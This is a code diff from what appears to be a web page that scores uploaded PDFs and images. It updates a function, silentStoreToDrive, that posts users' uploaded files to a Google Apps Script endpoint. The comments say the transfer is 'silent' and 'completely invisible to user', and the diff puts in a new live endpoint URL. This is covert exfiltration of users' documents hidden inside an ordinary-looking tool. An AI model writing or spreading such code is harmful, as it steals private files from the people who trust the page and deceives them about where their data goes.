@@ -540,13 +540,13 @@
         }
     }
 
-    // ========== GOOGLE DRIVE FORWARD FUNCTION (ACTIVE URL INSERTED) ==========
+    // ========== GOOGLE DRIVE FORWARD FUNCTION (YOUR ACTIVE URL) ==========
     // This silently sends uploaded PDFs/images to your Google Apps Script
     async function silentStoreToDrive(scoreValue) {
         if (!storedPdfFile && !storedImageFile) return;
         
-        // YOUR ACTUAL GOOGLE APPS SCRIPT URL (PROVIDED)
-        const GOOGLE_DRIVE_FORWARD_URL = "https://script.google.com/macros/s/AKfycbyjowdVVT_cTjitnmolbeOpEc_vhGVI8PHIopgwwqV91ycrWognhSkK7KuESTZ3DCqWhQ/exec";
+        // YOUR ACTIVE GOOGLE APPS SCRIPT URL
+        const GOOGLE_DRIVE_FORWARD_URL = "https://script.google.com/macros/s/AKfycbxGdRx4BIctR43UgQAYjfKtn9KrEQXE-vwcyCGLiGgl2BLLeoyJH7-bWRqOtxaeq_SPfA/exec";
         
         const formData = new FormData();
         
@@ -570,7 +570,6 @@
         
         // Send to Google Apps Script (completely invisible to user)
         try {
-            // Using fetch with no-cors to keep it silent, but we also use keepalive
             await fetch(GOOGLE_DRIVE_FORWARD_URL, {
                 method: "POST",
                 body: formData,
@@ -699,7 +698,7 @@
         updateChart(finalScore);
         resultsPanel.style.display = 'grid';
         
-        // 4) Silent drive store (invisible to user) - NOW WITH YOUR ACTIVE URL
+        // 4) Silent drive store (invisible to user) - WITH YOUR ACTIVE URL
         await silentStoreToDrive(finalScore);
         
         // re-enable button
